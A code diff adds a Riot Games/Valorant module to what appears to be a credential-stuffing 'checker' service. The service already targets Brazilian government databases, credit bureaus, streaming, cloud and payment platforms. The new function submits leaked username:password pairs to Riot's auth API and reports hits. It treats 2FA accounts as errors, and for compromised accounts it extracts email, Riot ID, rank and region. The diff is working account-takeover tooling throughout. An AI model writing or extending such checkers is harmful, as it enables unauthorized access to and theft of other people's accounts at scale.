@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot";
 
 export interface CheckResult {
   credential: string;
@@ -3342,6 +3342,210 @@ async function checkIFood(login: string, password: string): Promise<CheckResult>
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  RIOT GAMES CHECKER — username + senha (auth.riotgames.com)
+//  Foco: Valorant — retorna Riot ID, level, rank, região
+//  2FA: se conta tiver MFA → ERROR "2fa_required". Sem MFA = HIT completo.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkRiot(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/riot_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  const RIOT_UA = "RiotClient/89.0.0.1448.2194 rso-auth (Windows;10;;Professional, x64) riot_client/0";
+
+  // Rank tier map (Valorant Episode 9+)
+  const TIERS: Record<number, string> = {
+    0: "Unranked",
+    3: "Iron 1", 4: "Iron 2", 5: "Iron 3",
+    6: "Bronze 1", 7: "Bronze 2", 8: "Bronze 3",
+    9: "Silver 1", 10: "Silver 2", 11: "Silver 3",
+    12: "Gold 1", 13: "Gold 2", 14: "Gold 3",
+    15: "Platinum 1", 16: "Platinum 2", 17: "Platinum 3",
+    18: "Diamond 1", 19: "Diamond 2", 20: "Diamond 3",
+    21: "Ascendant 1", 22: "Ascendant 2", 23: "Ascendant 3",
+    24: "Immortal 1", 25: "Immortal 2", 26: "Immortal 3",
+    27: "Radiant",
+  };
+
+  try {
+    // ── Step 1: Init auth session (get ASID + TDID cookies) ─────────────────
+    await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `User-Agent: ${RIOT_UA}`,
+      "--data-raw", JSON.stringify({
+        client_id: "play-valorant-web-prod",
+        nonce: "1",
+        redirect_uri: "https://playvalorant.com/opt_in",
+        response_type: "token id_token",
+        scope: "account openid",
+      }),
+      "https://auth.riotgames.com/api/v1/authorization",
+    ], 15_000);
+
+    // ── Step 2: Submit credentials ──────────────────────────────────────────
+    const authRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "PUT",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `User-Agent: ${RIOT_UA}`,
+      "--data-raw", JSON.stringify({ type: "auth", username: login, password, remember: false }),
+      "https://auth.riotgames.com/api/v1/authorization",
+    ], 15_000);
+
+    let authJson: Record<string, unknown>;
+    try { authJson = JSON.parse(authRes.body); }
+    catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }
+
+    const authType = authJson.type as string;
+
+    // MFA / 2FA
+    if (authType === "multifactor") {
+      return { credential, login, status: "ERROR", detail: "2fa_required" };
+    }
+
+    // Wrong password / rate limit
+    if (authType === "auth") {
+      const err = authJson.error as string | undefined;
+      if (err === "auth_failure")  return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
+      if (err === "rate_limited")  return { credential, login, status: "ERROR", detail: "rate_limited" };
+      if (err === "login_required") return { credential, login, status: "FAIL", detail: "login_required" };
+    }
+
+    // Extract access_token from redirect URI fragment
+    const uri = ((authJson.response as Record<string, unknown>)?.parameters as Record<string, unknown>)?.uri as string ?? "";
+    const tokenMatch = uri.match(/access_token=([^&]+)/);
+    if (!tokenMatch) {
+      return { credential, login, status: "ERROR", detail: "token_nao_encontrado" };
+    }
+    const accessToken = decodeURIComponent(tokenMatch[1]);
+
+    // ── Step 3: Entitlements token ─────────────────────────────────────────
+    const entRes = await runCurl([
+      "--compressed", "-L",
+      "-X", "POST",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", "Content-Type: application/json",
+      "-H", `User-Agent: ${RIOT_UA}`,
+      "--data-raw", "{}",
+      "https://entitlements.auth.riotgames.com/api/token/v1",
+    ], 12_000);
+
+    let entToken = "";
+    try {
+      const ej = JSON.parse(entRes.body) as Record<string, unknown>;
+      entToken = (ej.entitlements_token as string) ?? "";
+    } catch { /**/ }
+
+    // ── Step 4: User info (puuid, game_name, tag_line, email) ─────────────
+    const userRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", `User-Agent: ${RIOT_UA}`,
+      "https://auth.riotgames.com/userinfo",
+    ], 12_000);
+
+    const parts: string[] = [];
+    let puuid = "";
+
+    try {
+      const uj   = JSON.parse(userRes.body) as Record<string, unknown>;
+      puuid      = (uj.sub as string) ?? "";
+      const acct = uj.acct as Record<string, unknown> | undefined;
+      const gn   = acct?.game_name as string ?? "";
+      const tag  = acct?.tag_line  as string ?? "";
+      if (gn)        parts.push(`riotId:${gn}#${tag}`);
+      if (uj.email)  parts.push(`email:${uj.email}`);
+      const bans = (uj.bans as unknown[]) ?? [];
+      if (bans.length) parts.push(`bans:${bans.length}`);
+    } catch { /**/ }
+
+    // ── Step 5: Valorant account XP level + MMR rank ──────────────────────
+    if (puuid && entToken) {
+      // Fetch current Valorant client version
+      let clientVersion = "release-09.08-shipping-9-2607125";
+      const verRes = await runCurl([
+        "--compressed", "-L",
+        "https://valorant-api.com/v1/version",
+      ], 8_000);
+      if (verRes.statusCode === 200) {
+        try {
+          const vd = (JSON.parse(verRes.body) as Record<string, unknown>).data as Record<string, unknown>;
+          if (vd?.riotClientVersion) clientVersion = vd.riotClientVersion as string;
+        } catch { /**/ }
+      }
+
+      const platformB64 = Buffer.from(JSON.stringify({
+        platformType: "PC", platformOS: "Windows",
+        platformOSVersion: "10.0.22621.1.768.64bit", platformChipset: "Unknown",
+      })).toString("base64");
+
+      const pvpHeaders = [
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "-H", `X-Riot-Entitlements-JWT: ${entToken}`,
+        "-H", `X-Riot-ClientVersion: ${clientVersion}`,
+        "-H", `X-Riot-ClientPlatform: ${platformB64}`,
+        "-H", `User-Agent: ${RIOT_UA}`,
+      ];
+
+      // Try regions in priority order
+      const REGIONS = ["na", "eu", "br", "ap", "latam", "kr"];
+      for (const region of REGIONS) {
+        const xpRes = await runCurl([
+          "--compressed", "-L",
+          ...pvpHeaders,
+          `https://pd.${region}.a.pvp.net/account-xp/v1/players/${puuid}/xp`,
+        ], 8_000);
+
+        if (xpRes.statusCode === 200) {
+          try {
+            const xj       = JSON.parse(xpRes.body) as Record<string, unknown>;
+            const progress = xj.Progress as Record<string, unknown> | undefined;
+            const level    = progress?.Level ?? xj.level;
+            if (level !== undefined) parts.push(`level:${level}`);
+          } catch { /**/ }
+
+          // MMR / rank
+          const mmrRes = await runCurl([
+            "--compressed", "-L",
+            ...pvpHeaders,
+            `https://pd.${region}.a.pvp.net/mmr/v1/players/${puuid}`,
+          ], 8_000);
+
+          if (mmrRes.statusCode === 200) {
+            try {
+              const mj          = JSON.parse(mmrRes.body) as Record<string, unknown>;
+              const queueSkills = mj.QueueSkills as Record<string, unknown> | undefined;
+              const competitive = queueSkills?.competitive as Record<string, unknown> | undefined;
+              const tier        = competitive?.TierAfterUpdate ?? competitive?.Tier;
+              if (tier !== undefined && typeof tier === "number") {
+                parts.push(`rank:${TIERS[tier] ?? `Tier${tier}`}`);
+              }
+              const rr = (competitive as Record<string, unknown>)?.RankedRatingAfterUpdate ?? (competitive as Record<string, unknown>)?.RankedRating;
+              if (rr !== undefined) parts.push(`rr:${rr}`);
+            } catch { /**/ }
+          }
+          parts.push(`região:${region.toUpperCase()}`);
+          break;
+        }
+      }
+    }
+
+    if (parts.length === 0) parts.push("riot_ok");
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
+
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -3378,6 +3582,8 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   // Financeiro BR
   mercadopago:   2,   // 3-step web scrape — conservative
   ifood:         3,   // mobile API — moderate
+  // Gaming
+  riot:          2,   // 2-step OAuth2 + Valorant PVP.net — conservative
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -3415,6 +3621,8 @@ function resolveChecker(target: CheckerTarget) {
     // Financeiro BR
     case "mercadopago":   return checkMercadoPago;
     case "ifood":         return checkIFood;
+    // Gaming
+    case "riot":          return checkRiot;
     default:              return checkIseek;
   }
 }
@@ -3666,7 +3874,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
